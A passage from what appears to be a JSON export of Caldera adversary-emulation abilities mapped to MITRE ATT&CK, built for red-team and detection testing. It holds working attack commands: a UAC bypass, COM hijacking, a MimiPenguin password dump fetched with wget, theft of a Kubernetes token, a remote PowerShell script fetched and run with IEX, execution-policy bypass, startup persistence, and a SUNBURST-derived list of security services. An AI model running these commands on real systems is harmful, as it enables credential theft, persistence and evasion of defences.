"variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: CMSTP", "ability_id": "d7bfcab15b9612dd53a15a4d8fc73633", "technique_id": "T1218.003", "tactic": "defense-evasion", "requirements": [], "name": "CMSTP Executing Remote Scriptlet", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["b27341_T1218.003_uacbypass.inf"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmstp.exe /s b27341_T1218.003_uacbypass.inf /au", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution: CMSTP", "ability_id": "a04b2cbd5fa6ea93e8ba16793ec6dc3e", "technique_id": "T1218.003", "tactic": "defense-evasion", "requirements": [], "name": "CMSTP Executing UAC Bypass", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.\n\nReference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Value 'MSAA AccPropServices'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Value $env:TEMP\\AtomicTest.dll; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}\\InprocServer32' -Name 'ThreadingModel' -Value 'Apartment' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-sta {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Component Object Model Hijacking", "ability_id": "0e63d76adc58b1d2a1ff6215a64e0a2a", "technique_id": "T1546.015", "tactic": "multiple", "requirements": [], "name": "COM Hijacking - InprocServer32", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Component Object Model Hijacking", "ability_id": "f204aa8bd030dab20527e2bc8a230f35", "technique_id": "T1546.015", "tactic": "multiple", "requirements": [], "name": "COM Hijacking with RunDLL32 (Local Server Switch)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test first create a custom CLSID class pointing to the Windows Script Component runtime DLL. This DLL looks for the ScriptletURL key to get the location of the script to execute.\nThen, it hijacks the CLSID for the Work Folders Logon Synchronization to establish persistence on user logon by creating the 'TreatAs' with the malicious CLSID as default value. The\ntest is validated by running 'rundll32.exe -sta \"AtomicTest\"' to avoid logging out.\n\nReferences:\n\nhttps://youtu.be/3gz1QmiMhss?t=1251\n\nhttps://github.com/enigma0x3/windows-operating-system-archaeology", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg delete \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\AtomicTest.1.00\\CLSID\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /ve /T REG_SZ /d \"C:\\WINDOWS\\system32\\scrobj.dll\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\InprocServer32\" /v \"ThreadingModel\" /T REG_SZ /d \"Apartment\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\ScriptletURL\" /ve /T REG_SZ /d \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{00000001-0000-0000-0000-0000FEEDACDC}\\VersionIndependentProgID\" /ve /T REG_SZ /d \"AtomicTest\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\" /f; reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\\TreatAs\" /ve /T REG_SZ /d \"{00000001-0000-0000-0000-0000FEEDACDC}\" /f; rundll32.exe -sta \"AtomicTest\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Component Object Model Hijacking", "ability_id": "2db3b2385ba856424bfe130f69fc0529", "technique_id": "T1546.015", "tactic": "multiple", "requirements": [], "name": "COM hijacking via TreatAs", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "List credentials currently stored on the host via the built-in Windows utility cmdkey.exe\nCredentials listed with Cmdkey only pertain to the current user\nPasswords will not be displayed once they are stored\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey\nhttps://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "cmdkey /list", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Cached Domain Credentials", "ability_id": "bb0df721f4a4defa743efe9e61837c44", "technique_id": "T1003.005", "tactic": "credential-access", "requirements": [], "name": "Cached Credential Dump via Cmdkey", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use import command from ImageMagick to collect a full desktop screenshot\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm /tmp/T1113_desktop.png"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if import -help > /dev/null 2>&1; then : ; else sudo apt install graphicsmagick-imagemagick-compat; fi;  ;  import -window root /tmp/T1113_desktop.png", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Screen Capture", "ability_id": "5fab72013505efcd896475f9fe06c280", "technique_id": "T1113", "tactic": "collection", "requirements": [], "name": "Capture Linux Desktop using Import Tool", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1003.007Test3.txt > /dev/null"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [ -x \"$(command -v ldd --version)\" ]; then : ; else sudo apt-get -y install libc-bin; fi; if [ -x \"$(command -v python2 --version)\" ]; then : ; else sudo apt-get -y install python2; fi; if [ -x \"$(command -v strings --version)\" ]; then : ; else sudo apt-get -y install binutils; fi; if [ -f \"/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh\" ]; then : ; else wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz; mkdir /tmp/mimipenguin; tar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin; fi;  ;  sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt; cat /tmp/T1003.007Test3.txt", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Proc Filesystem", "ability_id": "4cecc12b906ec724e9f2178fed1e7071", "technique_id": "T1003.007", "tactic": "credential-access", "requirements": [], "name": "Capture Passwords with MimiPenguin", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Access the Kubernetes service account access token stored within a container in a cluster.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["kubectl --context kind-atomic-cluster delete pod atomic-pod"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Kubernetes List Secrets", "ability_id": "1a877cae5bfda737bd8c362423d1b8e3", "technique_id": "T1552.007", "tactic": "credential-access", "requirements": [], "name": "Cat the contents of a Kubernetes service account token file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.\nKeys will look like - \\SystemCertificates\\CA\\Certificates or \\SystemCertificates\\Root\\Certificates\nReference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec\nReference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Get-ChildItem -Path Cert:\\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\\temp\\atomic.pfx", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Unsecured Credentials: Private Keys", "ability_id": "000549902a51ef21f57d3d28a6e5ecc0", "technique_id": "T1552.004", "tactic": "credential-access", "requirements": [], "name": "CertUtil ExportPFX", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Rename certutil and decode a file. This is in reference to latest research by FireEye [here](https://www.fireeye.com/blog/threat-research/2018/09/apt10-targeting-japanese-corporations-using-updated-ttps.html)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\tcm.tmp >nul 2>&1 && del %temp%\\T1140_calc2.txt >nul 2>&1 && del %temp%\\T1140_calc2_decoded.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy %windir%\\system32\\certutil.exe %temp%\\tcm.tmp && %temp%\\tcm.tmp -encode C:\\Windows\\System32\\calc.exe %temp%\\T1140_calc2.txt && %temp%\\tcm.tmp -decode %temp%\\T1140_calc2.txt %temp%\\T1140_calc2_decoded.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Deobfuscate/Decode Files or Information", "ability_id": "e510c5fd2f1ea418990fcf06775bc9b4", "technique_id": "T1140", "tactic": "defense-evasion", "requirements": [], "name": "Certutil Rename and Decode", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Change Default File Association From cmd.exe of hta to notepad.\n\nUpon successful execution, cmd.exe will change the file association of .hta to notepad.exe. \n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["assoc  .hta=htafile"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "assoc .hta=txtfile", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Event Triggered Execution: Change Default File Association", "ability_id": "52b03ab57c6d0594e014da562857b49f", "technique_id": "T1546.001", "tactic": "multiple", "requirements": [], "name": "Change Default File Association", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["try { Set-ExecutionPolicy -ExecutionPolicy Default -Scope LocalMachine -Force } catch {}"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "0424ccb447bfa66b94162266f55ecd52", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Change Powershell Execution Policy to Bypass", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will modify the HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders  -V \"Startup\" value \nto point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; Remove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Startup\" -Value \"#{new_startup_folder}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "34dfc0264e6fd27b4997fea21c0bbada", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Change Startup Folder - HKCU Modify User Shell Folders Startup Value", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will modify the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders -V \"Common Startup\" \nvalue to point to a new startup folder where a payload could be stored to launch at boot.  *successful execution requires system restart\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"; Remove-Item \"$env:TMP\\atomictest\\\" -Recurse -Force"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-Item -ItemType Directory -path \"#{new_startup_folder}\"; Copy-Item -path \"#{payload}\" -destination \"#{new_startup_folder}\"; Set-ItemProperty -Path  \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\" -Name \"Common Startup\" -Value \"#{new_startup_folder}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "1169b67e9f991716ba91833486f3c564", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changes the user password to hinder access attempts. Seen in use by LockerGoga. Upon execution, log into the user account \"AtomicAdministrator\" with\nthe password \"HuHuHUHoHo283283\".\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net.exe user AtomicAdministrator /delete >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user AtomicAdministrator User2ChangePW! /add && net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "f7e779369b3f0cff24152d7dd94eca98", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Change User Password - Windows", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test changes the user password to hinder access to the account using passwd utility.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "passwd ARTUser", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "passwd ARTUser", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Account Access Removal", "ability_id": "37df66b74e6c5b241b1f5b45f64676a4", "technique_id": "T1531", "tactic": "impact", "requirements": [], "name": "Change User Password via passwd", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["userdel art"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "useradd -s /bin/bash art; cat /etc/passwd |grep ^art; chsh -s /bin/sh art; cat /etc/passwd |grep ^art", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Bash", "ability_id": "5c568978b49775033fc57f7740b84e43", "technique_id": "T1059.004", "tactic": "execution", "requirements": [], "name": "Change login shell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changing RDP Port to Non Standard Port via Command_Prompt\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 3389 -f >nul 2>&1 && netsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 -f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Remote Services: Remote Desktop Protocol", "ability_id": "41e7255e8dc65f43482a623000773dd3", "technique_id": "T1021.001", "tactic": "lateral-movement", "requirements": [], "name": "Changing RDP Port to Non Standard Port via Command_Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Changing RDP Port to Non Standard Port via Powershell\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 3389; Remove-NetFirewallRule -DisplayName \"RDPPORTLatest-TCP-In\" -ErrorAction ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Remote Desktop Protocol", "ability_id": "a2a4d8a2f11ed41fe32ab1001ed78ffd", "technique_id": "T1021.001", "tactic": "lateral-movement", "requirements": [], "name": "Changing RDP Port to Non Standard Port via Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check to see if Gooogle Chrome browser is installed", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "which google-chrome", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which google-chrome", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "830bb6ed-9594-4817-b1a1-c298c0f9f425", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Check Chrome", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check to see if GoLang is installed", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "which go", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "which go", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "9849d956-37ea-49f2-a8b5-f2ca080b315d", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Check Go", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check to see what version of python is installed", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "python3 --version;python2 --version;python --version", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "python3 --version;python2 --version;python --version", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "python3 --version&python2 --version&python --version", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Software Discovery", "ability_id": "b18e8767-b7ea-41a3-8e80-baf65a5ddef5", "technique_id": "T1518", "tactic": "discovery", "requirements": [], "name": "Check Python", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Check for security services. Security service list is based on the SUNBURST malware observed in a Solarwinds related compromise (https://research.checkpoint.com/2020/sunburst-teardrop-and-the-netsec-new-normal/).", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$securityServices = @(\n    \"msmpeng\",\n    \"windefend\",\n    \"mssense\",\n    \"sense\",\n    \"microsoft.tri.sensor\",\n    \"microsoft.tri.sensor.updater\",\n    \"cavp\",\n    \"cb\",\n    \"carbonblack\",\n    \"carbonblackk\",\n    \"cbcomms\",\n    \"cbstream\",\n    \"csfalconservice\",\n    \"csfalconcontainer\",\n    \"csagent\",\n    \"csdevicecontrol\",\n    \"csfalconservice\",\n    \"xagt\",\n    \"xagtnotif\",\n    \"fe_avk\",\n    \"fekern\",\n    \"feelam\",\n    \"fewscservice\",\n    \"ekrn\",\n    \"eguiproxy\",\n    \"egui\",\n    \"eamonm\",\n    \"eelam\",\n    \"ehdrv\",\n    \"ekrnepfw\",\n    \"epfwwfp\",\n    \"ekbdflt\",\n    \"epfw\",\n    \"fsgk32st\",\n    \"fswebuid\",\n    \"fsgk32\",\n    \"fsma32\",\n    \"fssm32\",\n    \"fnrb32\",\n    \"fsaua\",\n    \"fsorsp\",\n    \"fsav32\",\n    \"f-secure gatekeeper handler starter\",\n    \"f-secure network request broker\",\n    \"f-secure webui daemon\",\n    \"fsma\",\n    \"fsorspclient\",\n    \"f-secure gatekeeper\",\n    \"f-secure hips\",\n    \"fsbts\",\n    \"fsni\",\n    \"fsvista\",\n    \"f-secure filter\",\n    \"f-secure 